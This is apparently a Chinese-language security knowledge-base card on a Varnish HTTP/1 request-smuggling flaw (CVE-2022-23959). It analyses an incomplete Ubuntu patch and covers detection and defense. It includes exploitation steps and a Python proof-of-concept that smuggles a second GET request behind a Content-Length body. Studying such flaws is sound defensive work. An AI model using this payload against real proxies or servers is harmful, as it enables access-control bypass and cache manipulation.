---
id: web-generic-http-smuggling-varnish-pipeline-cl-residual
title: Varnish HTTP/1 管线残留：CL body 后的第二请求被复用连接转发（CVE-2022-23959 补丁路径正交）
type: scenario
domain: web
path: web/generic/http-smuggling
technique: varnish-pipeline-cl-residual-smuggling
tags:
- http-smuggling
- varnish
- http1
- pipeline
- content-length
- patch-analysis
- cve
cve:
- CVE-2022-23959
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Varnish < 6.6.2、< 7.0.2（CVE-2022-23959 修复版本）；实验环境 Ubuntu 6.6.1-1ubuntu0.2
verification:
  verified_by: verifier-V30
  verified_at: '2026-11-05T03:19:23+08:00'
  notes: 已对照原文核对HTTP1状态机/pipeline残留/VRB_Ignore补丁/CL=5与CL=0 PoC；原文仅直接连Varnish观察到管线化与后端连接复用，未部署前端差异环境，端到端走私与缓存投毒均未证明；Ubuntu补丁有效性未独立复核；卡片已按medium并注明边界
url: /docs/web/generic/http-smuggling/web-generic-http-smuggling-varnish-pipeline-cl-residual/
draft: false
kb_aliases:
- CVE-2022-23959
- Varnish 请求走私
- Varnish pipeline 残留
- CL=0 走私
- BS_LENGTH pipeline
- Ubuntu CVE-2022-23959 补丁无效
---

## 一句话结论

Varnish 6.6.1 在读取 `Content-Length` 指定的 body 后，会把同一 TCP 缓冲区中剩余的数据当作新请求继续解析并复用后端连接转发；Ubuntu 的 CVE-2022-23959 补丁只处理 `BS_ERROR` 路径，而 `CL=5`/`CL=0` 走的是 `BS_LENGTH`/`BS_NONE`，补丁路径与实际解析路径正交。

## 原理

- Varnish 的 HTTP/1 解析是手工状态机 `HTTP1_Session`：`H1CLEANUP → H1NEWREQ → H1HEADERS → H1BODY → H1BUSY → H1FLUSH`。一次 `read()` 可能读入多个请求的字节，未消费部分留在 pipeline 缓冲区。
- `http1_dissect()` 解析第一个请求头后，根据 `Content-Length` 设置 body 状态：`CL>0` 为 `BS_LENGTH`，`CL=0` 为 `BS_NONE`，chunked 为 `BS_CHUNKED`，读取出错为 `BS_ERROR`。
- 对 `BS_LENGTH`，`v1f_straight()` 从 pipeline 读取恰好 `Content-Length` 字节；对 `BS_NONE`，根本不调用 body 读取器。两种情况都不会消费 body 之后的字节。
- 请求处理完成后，`HTC_RxInit()` 在 `H1CLEANUP` 阶段检查 `pipeline_b`，把剩余字节 `memmove` 到新 `rxbuf`，状态机进入 `H1NEWREQ`，把剩余字节当作新请求解析。
- 于是构造 `POST /` + `Content-Length: 5` + 恰好 5 字节 body + 第二个 `GET /smuggled`，Varnish 会在同一后端连接上先后转发 POST 和 GET；`CL=0` 变体同样成立。
- Ubuntu 6.6.1-1ubuntu0.2 的 `debian/patches/CVE-2022-23959.patch` 只在 `VRB_Ignore()` 中增加 `if (req->req_body_status == BS_ERROR) req->doclose = SC_RX_BODY;`。该函数处理 body 读取出错；`BS_LENGTH`/`BS_NONE` 下它不会被调用，所以补丁没有覆盖 pipeline 残留路径。
- **重要边界**：如果攻击者直接连接 Varnish 并发送两个请求，这只是 HTTP/1.1 管线化（pipelining），两个响应是正常行为，不等于请求走私。要形成真正的走私危害，需要一个前端代理/网关把这段字节流视为一个请求，而 Varnish/后端视为两个请求，或后端无条件信任 Varnish 复用的连接。原文的直接连接测试证明了 pipeline 残留和连接复用，但没有部署前端差异环境，因此“端到端走私/访问控制绕过”未被完整证明；本卡按 medium 置信度记录。

## 触发条件

- 受影响版本：Varnish < 6.6.2、< 7.0.2（CVE-2022-23959）；实验为 Ubuntu 6.6.1-1ubuntu0.2。
- 前端代理与 Varnish 对请求边界的解析存在差异，或后端信任 Varnish 连接上出现的额外请求。
- 攻击者能控制发往前端的 HTTP/1 字节流，构造 `Content-Length` 与后续数据。
- 仅直接连接 Varnish 时只能观察到管线化和后端连接复用，不能据此认定访问控制绕过。

## 利用步骤

1. 确认 Varnish 版本和补丁状态：`varnishd -V`，检查发行版 `debian/patches/` 是否只有 `VRB_Ignore()` 的 `BS_ERROR` 补丁。
2. 在 Varnish 前部署/确认一个前端代理，使其把客户端字节流按单一请求转发。
3. 构造 `POST /` + `Content-Length: 5` + `X=Y\r\n` + `GET /smuggled HTTP/1.1...`，通过前端发送。
4. 在后端侧抓包/日志确认收到两个请求，而前端只记录一个请求；这才是走私的判定标准。
5. 变体：`Content-Length: 0` 后直接跟第二个请求，验证 `BS_NONE` 路径不会调用 body 读取器。
6. 若只做直接连接测试，记录为“pipeline 残留/连接复用”而非“走私成功”。

## PoC

```python
import socket

s = socket.socket()
s.settimeout(5)
s.connect(("127.0.0.1", 6081))  # 有前端时应连接前端端口
payload = (
    b"POST / HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Content-Length: 5\r\n"
    b"\r\n"
    b"X=Y\r\n"
    b"GET /smuggled HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)
s.send(payload)
resp = b""
try:
    while True:
        d = s.recv(4096)
        if not d:
            break
        resp += d
except Exception:
    pass
s.close()
print(resp.decode(errors="replace"))
```

后端侧确认：

```bash
tcpdump -i lo port 8082 -A
# 观察同一后端 TCP 连接上是否连续出现 POST / 与 GET /smuggled
```

直接连接 Varnish 时看到两组响应只能说明管线化；必须结合前端日志（一个请求）与后端日志（两个请求）才能证明走私。

## 变体与关联

- 变体：`Content-Length: 0` 走私，利用 `BS_NONE` 不调用 body 读取器，pipeline 残留直接进入下一请求。
- 变体：CL/TE 混用、chunked 边界等经典走私，需要前端与 Varnish 的解析差异；原文未做这些测试。
- 关联：CVE-2022-45059（hop-by-hop 头诱导）在原文中仅为理论梳理，作者明确说明未在 6.6.1 上复现，故不单独建卡。
- 关联：补丁差异审计方法见 [[code-analysis-vuln-discovery-cve-patch-diff-audit]]；本卡补充的是“补丁覆盖的状态路径与实际输入路径是否一致”。
- 边界：原文的缓存投毒尝试未成功，因为 POST 响应不会被 GET 请求命中；不能把该实验描述为完整缓存投毒链。

## 检测与防御

- **检测（版本/补丁）**：确认 Varnish 升级到 6.6.2 / 7.0.2 或更高；发行版补丁只改 `VRB_Ignore()` 的 `BS_ERROR` 分支时，需单独验证 `BS_LENGTH`/`BS_NONE` 路径。
- **检测（网络）**：前端与后端对同一连接的请求数不一致；后端日志出现前端未记录的路径；同一后端连接上连续出现多个请求。
- **检测（代码）**：审计 `HTTP1_Session`、`HTC_RxInit`、`v1f_straight` 与 `VRB_Ignore` 的 body 状态分支，确认补丁是否覆盖所有可达状态。
- **防御**：升级到修复版本；前端代理禁用/规范化 HTTP/1.1 管线化，拒绝带多余字节的请求；后端不复用不可信连接或按请求边界重新校验；对 CL/TE 冲突做统一拒绝。
- **加固**：监控前端与后端的请求计数差异；对关键路径启用请求级关联 ID，发现“前端一个、后端两个”的异常。
